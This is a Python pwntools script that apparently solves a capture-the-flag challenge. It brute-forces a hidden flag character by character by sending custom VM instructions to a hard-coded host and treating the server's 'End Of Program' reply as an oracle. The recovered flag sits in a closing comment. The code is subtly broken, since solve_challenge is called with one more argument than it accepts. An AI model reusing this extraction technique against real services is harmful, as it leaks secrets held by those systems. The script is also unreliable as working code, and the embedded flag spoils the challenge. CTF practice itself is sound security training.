from pwn import *
def solve_challenge(host, port, instructions):
    conn = remote(host, port)
    for instruction in instructions:
        conn.sendline(instruction)
        response = conn.recv().decode()

    response = conn.recv(timeout= 0.2).decode()

    if response.strip() == "End Of Program":
        return True
    conn.close()
    
if __name__ == "__main__":
    host = "85.120.206.124" 
    port = 31348  # port
    flag = ""
    k = 0
    while k<21:
        for i in range(126, 32, -1):
            instructions = ['INC Reg0', 'JMPNZ Reg0 push_flag', 'END',
                            'main:','POP Reg0', 'JMPNZ Reg0 char','END',
                            'stop:', 'END',
                            'char:', f'LOADK Reg1 {i}', 'CMP Reg0 Reg1',
                            'POP Reg2', 'JMPNZ Reg2 stop', 'END','\n']
            # print(instructions)
            for _ in range(k):
                instructions.insert(4,"POP Reg0")
            # print(instructions)
            print(i)
            if solve_challenge(host, port, instructions, i):
                print(chr(i), 'got a character babe')
                k +=1
                flag += chr(i)
                break
        print("_______________flag________________")
        print("___________________________________")
        print(flag[::-1])
        print("___________________________________")
        print("_______________flag________________")
        #   UVTCA{t1m1ng_att4ck_<3}
